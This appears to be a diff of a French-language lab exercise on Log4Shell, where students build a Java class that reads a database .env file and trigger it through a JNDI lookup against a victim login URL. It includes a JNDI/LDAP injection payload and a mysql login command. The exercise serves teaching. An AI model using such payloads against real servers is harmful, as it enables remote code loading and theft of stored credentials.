@@ -36,12 +36,12 @@ Etapes à reproduire pour la réalisation du tp :
 Créer un fichier java dans lequel le code devra récupérer et écrire le .env de la base de données dans les logs du serveur.
 Appeler votre class java dans une requete faite au serveur, grace à un lookup vu en cours.
 
-Exemple de lookup : "${jndi:ldap://<ipserver>:9999/WithReturn}"
+Exemple de lookup : "${jndi:ldap://ipserver:9999/WithReturn}"
     
 Pour se connecter a la BDD : `mysql -u root -p ipadress`
     ipadress se trouve dans le .env
     
-L'URL de la victime : <ipvictime>/login
+L'URL de la victime : ipvictime:8080/login
 
 
 ### Question : 
